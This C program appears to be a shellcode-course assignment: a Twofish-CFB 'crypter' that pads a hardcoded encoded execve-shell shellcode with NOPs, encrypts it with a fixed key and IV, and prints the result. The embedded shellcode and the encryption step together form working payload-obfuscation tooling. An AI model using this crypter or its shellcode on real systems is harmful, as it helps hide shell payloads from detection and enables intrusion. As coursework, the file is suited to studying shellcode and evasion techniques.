/*
 * Author: John Stigerwalt
 * SLAE: Assignment #7
 * Program: Two-fish CFB Encrypter  
 * Shellcode Used: Encoded Exceve Shell from Assignment #4
 * Orginal Program Based From: https://gist.github.com/bricef/2436364/
 * Mcrypt: http://mcrypt.sourceforge.net/
 * Mcrypt & GCC Example: http://mcrypt.hellug.gr/lib/mcrypt.3.html
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mcrypt.h>
#include <math.h>
#include <stdint.h>

int encrypt(
    void* buffer,
    int buffer_len,
    char* IV,
    char* key,
    int key_len

) {
  MCRYPT td = mcrypt_module_open("twofish", NULL, "cfb", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}
  mcrypt_generic_init(td, key, key_len, IV);
  mcrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);
  return 0;
}

int main() {
    
  MCRYPT td, td2;
  unsigned char * plaintext = "\x31\xc0\x99\x31\xff\x6a\x01\x5f\xb4\xe5\x88\xe0\xeb\x27\x5e\x56\x31\xdb\x31\xc9\xb1\x19\x8a\x1e\x30\xd8\xf6\xd0\x88\x06\x88\xd8\x46\xfe\xc9\x38\xd1\x75\xef\x80\xec\x01\x88\xe0\x39\xd7\x75\x02\xeb\x08\x4f\xeb\xd7\xe8\xd4\xff\xff\xff\x30\xda\x9f\x4d\x4f\x9d\xc3\xa\x54\xda\xc9\x4c\x58\x3a\x44\x95\x32\x88\x9e\xfe\x80\xb1\x74\x83\xb";
  char* IV = "4245454642454546";
  char *key = "0d0a6c3333333337";
  int keysize = 16; /* 128 bits */
  
  /*
   * Buffer needs to be in 16 bit blocks. Encoder Stub Exceve Shell is 83 bytes, 16 x 6 = 96
   * Set "unsigned char buffer[x]" to the closest 16 bit block, padding is added using NOPs (0x90's) 
   */
  
  unsigned char buffer[96];
  int counter; 
  int buffer_len = 96;
  
 /*
  * Set up the buffer to add NOP's to the remaining bytes of the unused block of 16s. Do not undershoot block
  * or decryption shellcode will fail.
  */
 
 for ( counter = 0; counter < buffer_len; counter++){
   buffer[counter]=0x90;
  }
  
  /* Now copy the plaintext shellcode to the buffer */
  
  strncpy(buffer, plaintext, buffer_len);
  int plain_len = strlen(plaintext);
  printf("\nPlainText:\n");
  for ( counter = 0; counter < plain_len; counter++){
    printf("%02x",plaintext[counter]);
  }
  
  /** Encrypt the buffer **/
  
  encrypt(buffer, buffer_len, IV, key, keysize); 
  printf("\n\nEncrypted Shellcode:\n"); 
  printf("\"");
  for ( counter = 0; counter < buffer_len; counter++){
   printf("\\x%02x",buffer[counter]);
  }
  
  printf("\"\n\n");

  return 0;
}
